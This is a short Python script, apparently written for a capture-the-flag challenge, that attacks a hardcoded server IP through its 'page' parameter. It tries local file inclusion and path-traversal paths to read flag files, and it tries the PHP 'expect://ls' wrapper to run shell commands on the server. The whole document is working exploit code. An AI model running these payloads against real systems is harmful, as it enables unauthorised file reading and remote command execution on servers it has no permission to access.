#!/usr/bin/env python3
"""
RFI扫描器 - 查找flag
"""

import requests
import re

target = "http://47.113.178.182:32827/"

# 测试flag位置
flag_locations = [
    "/flag",
    "/flag.txt",
    "/tmp/flag",
    "/var/www/flag",
    "/var/www/html/flag",
    "flag",
    "flag.txt",
    "../flag",
    "../../flag",
    "/flagaaa",
]

print("[*] 测试flag位置...")
for path in flag_locations:
    try:
        r = requests.get(target, params={'page': path}, timeout=5)
        if 'flagTOGOGO{' in r.text:
            print(f"\n[+] 找到FLAG!")
            print(f"[+] 路径: {path}")
            flags = re.findall(r'flagTOGOGO\{[^}]+\}', r.text)
            if flags:
                print(f"[+] FLAG: {flags[0]}")
                break
    except:
        pass

# 尝试使用expect://包装器 (如果支持)
print("\n[*] 尝试expect://...")
try:
    r = requests.get(target, params={'page': 'expect://ls'}, timeout=5)
    if 'bin' in r.text or 'flag' in r.text.lower():
        print("[+] expect:// 可用!")
        print(r.text[:500])
except:
    pass
